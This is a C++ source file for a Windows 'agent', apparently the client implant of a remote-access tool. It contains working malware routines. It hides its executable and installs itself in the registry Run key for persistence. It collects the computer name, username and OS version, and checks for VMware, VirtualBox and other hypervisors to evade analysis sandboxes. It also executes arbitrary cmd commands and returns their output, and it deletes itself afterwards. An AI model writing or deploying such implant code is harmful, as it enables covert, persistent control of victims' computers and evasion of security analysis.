#include "pch.h"
#include "AgentUtils.h"

#pragma warning(disable : 4996)

// function will make the exe file hidden file
void AgentUtils::Hide()
{
	string progName = EXE_NAME;
	LPCSTR lpName = progName.c_str();
	int attr = GetFileAttributes(lpName);

	if ((attr & FILE_ATTRIBUTE_HIDDEN) == 0)
		SetFileAttributes(lpName, attr | FILE_ATTRIBUTE_HIDDEN);
}

// tool will set the agent to run automatically with pc's startup
void AgentUtils::AddAutoRun()
{
	HKEY hKey;
	LPCSTR lpSubKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\";

	DWORD Disposition = -1;

	LSTATUS lKeyStatus = RegCreateKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &Disposition);

	if (lKeyStatus != ERROR_SUCCESS)
		return;

	char bData[MAX_PATH];
	GetModuleFileName(NULL, bData, MAX_PATH);

	LSTATUS lValStatus = RegSetValueEx(hKey, APP_NAME, 0, REG_SZ, (const BYTE*)bData, sizeof(bData));

	if (lValStatus != ERROR_SUCCESS)
		return;

	RegCloseKey(hKey);
}

// function will return the computer's name
std::string AgentUtils::ComputerName()
{
	DWORD buffSize = MAX_COMPUTERNAME_LENGTH + 1;
	TCHAR pcnameBuff[MAX_COMPUTERNAME_LENGTH + 1];

	BOOL res = GetComputerName(pcnameBuff, &buffSize);

	return pcnameBuff;
}

// gets the username
std::string AgentUtils::UserName()
{
	TCHAR usernameBuff[MAX_USERNAME_LENGTH + 1];
	DWORD buffSize = MAX_USERNAME_LENGTH + 1;
	BOOL userNameSucceed = GetUserName(usernameBuff, &buffSize);

	return usernameBuff;
}

// will return the windows version in a string
std::string AgentUtils::WinVersion()
{
	DWORD Version = 0;
	DWORD MajorVersion = 0;
	DWORD MinorVersion = 0;
	DWORD Build = 0;

	Version = GetVersion();

	// Get the  windows OS version
	MajorVersion = (DWORD)(LOBYTE(LOWORD(Version)));
	MinorVersion = (DWORD)(HIBYTE(LOWORD(Version)));

	//build number
	if (Version < 0x80000000)
		Build = (DWORD)(HIWORD(Version));

	std::string versionString = std::to_string(MajorVersion) + "." + std::to_string(MinorVersion) + "(" + std::to_string(Build) + ")";

	return versionString;
}

// credit: https://stackoverflow.com/questions/41750144/c-how-to-detect-the-virtual-machine-your-application-is-running-in-has-focus
bool AgentUtils::IsVM()
{

	int cpuInfo[4] = {};

	//
	// Upon execution, code should check bit 31 of register ECX
	// (the “hypervisor present bit”). If this bit is set, a hypervisor is present.
	// In a non-virtualized environment, the bit will be clear.
	//
	__cpuid(cpuInfo, 1);


	if (!(cpuInfo[2] & (1 << 31)))
		return false;

	//
	// A hypervisor is running on the machine. Query the vendor id.
	//
	const auto queryVendorIdMagic = 0x40000000;
	__cpuid(cpuInfo, queryVendorIdMagic);

	const int vendorIdLength = 13;
	using VendorIdStr = char[vendorIdLength];

	VendorIdStr hyperVendorId = {};

	memcpy(hyperVendorId + 0, &cpuInfo[1], 4);
	memcpy(hyperVendorId + 4, &cpuInfo[2], 4);
	memcpy(hyperVendorId + 8, &cpuInfo[3], 4);
	hyperVendorId[12] = '\0';

	static const VendorIdStr vendors[]{
	"KVMKVMKVM\0\0\0", // KVM 
	"Microsoft Hv",    // Microsoft Hyper-V or Windows Virtual PC */
	"VMwareVMware",    // VMware 
	"XenVMMXenVMM",    // Xen 
	"prl hyperv  ",    // Parallels
	"VBoxVBoxVBox"     // VirtualBox 
	};

	for (const auto& vendor : vendors)
	{
		if (!memcmp(vendor, hyperVendorId, vendorIdLength))
			return true;
	}

	return false;
}

// function will excecute a cmd command and return the output as a string
std::string AgentUtils::execute(const std::string& cmd)
{
	std::array<char, 128> buffer;
	std::string result;
	std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd.c_str(), "r"), _pclose);
	if (!pipe) {
		throw std::runtime_error("popen() failed!");
	}
	while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
		result += buffer.data();
	}
	return result;
}

// credit: https://stackoverflow.com/questions/3457040/how-to-write-a-program-in-c-such-that-it-will-delete-itself-after-execution
void AgentUtils::SelfDelete()
{
	TCHAR szModuleName[MAX_PATH];
	TCHAR szCmd[2 * MAX_PATH];
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	GetModuleFileName(NULL, szModuleName, MAX_PATH);

	StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);

	CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);
}
